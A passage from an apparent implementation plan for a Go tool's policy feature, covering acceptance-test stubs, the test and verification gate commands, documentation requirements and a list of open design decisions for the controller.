	// Assert: scan --baseline --json output is byte-identical, status --json is
	// byte-identical, and the string "policy" appears in neither payload.
}

func TestPolicyEvaluationTouchesNoHostFilesystem(t *testing.T) {
	// Extend the existing source audit: every non-test file in internal/policy
	// must contain no os., exec., net., or syscall reference. Reuse
	// assertSourceHasNoDirectHostFilesystemCalls; policy/starter.go's //go:embed
	// is compile-time and is the one permitted exception — assert it embeds
	// exactly one file.
}
```

Add `"internal/policy"` to the directory list in `TestScopedCollectorsUseOnlyTheInjectedFilesystemForHostReads` if the audit helper suits it, or write the dedicated audit above — state which in the task report.

- [ ] **Step 2: Run it to verify it fails**

Run: `go test ./internal/acceptance -run Policy -count=1`

Expected: FAIL — the lifecycle test fails at step 3 (`policy check exited 0, want 3`) until every earlier task is wired end to end through `cmd/ssc-init`.

- [ ] **Step 3: Implement**

Fix whatever the end-to-end run exposes. Do not weaken the assertions: if `scan --baseline --json` is not byte-identical with and without a policy document, something wrote policy state into the scan contract and that is release-blocking.

- [ ] **Step 4: Run the full gate**

```sh
go clean -testcache && go test -race -count=1 ./...
go test ./internal/policy -count=50
go test ./internal/acceptance -run Policy -count=50
go vet ./...
go mod verify
gofmt -l internal cmd
git diff --check
```

`go.mod` and `go.sum` must be unchanged by this program — confirm with `git diff --stat HEAD~14 -- go.mod go.sum` producing no output.

- [ ] **Step 5: Documentation and commit**

`README.md` gains a Policy section stating, without embellishment: the document location and the `--policy` override; that every shipped rule is disabled; that pins are trust on first use and pinning a compromised machine approves the compromise; that `policy check` reads the latest snapshot and does not scan; that the exit code is 3 on violation; and that the build's enforcement capability is **advisory plus on-demand** — it cannot block anything, and the nonzero exit gates a pipeline, not an execution.

`CLAUDE.md` records: `internal/policy` is pure and must never import `internal/report`; the ladder classifier lives in `internal/inventory`; precedence levels 1–3 are present and inert with stated reasons; policy tables carry no `scan_id`; and nothing about policy may enter `ssc-init.scan.v3`.

```bash
git add internal/acceptance README.md CLAUDE.md
git commit -m "test: prove the policy lifecycle and its contract isolation"
```

---

## Open decisions for the controller

These are places the design does not settle, and the implementer should not settle them alone.

1. **`policy check` exit code on violation.** The design says only "exits nonzero". This plan uses `3`, keeping `2` for invalid arguments (the existing CLI convention) and `1` for operational failure, so a CI gate can distinguish "policy says no" from "the tool broke". If a single nonzero code is preferred, `1` collides with the existing failure code and `2` collides with argument errors — say which.
2. **Audit store location.** The policy design says "separate from the inventory snapshot"; foundation §5.3 says "a single state database" and §5.2 module 7 puts decisions, exceptions, and audit history in that store. This plan reads them together as *separate tables in `state.db`*, following the `asset_history` precedent (no `scan_id`, no foreign key, not pruned with snapshots). If "separate" was meant as a separate file, Task 8 changes shape substantially and duplicates the hardened open path.
3. **Where the ladder classifier lives.** Task 4 moves it to `internal/inventory` because `internal/report` must import `internal/policy` to render. The alternative — `internal/policy` imports `internal/report` and the POLICY section is rendered from a report-local type the CLI translates into — avoids the move but makes the policy engine depend on the renderer. Task 4 is the largest no-behaviour-change diff in the program; confirm before it runs.
4. **`policy check` and "no filesystem access".** The design says it "reads the latest snapshot and does not scan — no filesystem access". It must still open the policy document and the SQLite store. This plan reads the sentence as *no scanning access*: no collector root is opened, no process runs, no socket opens. Confirm that reading is right before Task 11's test is written against it.
5. **Whether the local document may set retention (Task 13). RESOLVED.** It may
   not. Foundation §10 reserves retention configuration for signed policy
   `[BUNDLE]`; the parser rejects the field and the store seam remains unwired.
6. **`unpinned` default noise.** With `unpinned` enabled, every install and upgrade fires. It ships disabled, so nothing fires by default — but a user who enables it after `policy pin` will see a burst after each update batch. That is the design's stated intent (keeping the noisy rule separate from the sharp one); confirm no throttle is wanted, because a throttle would need its own state and its own justification.
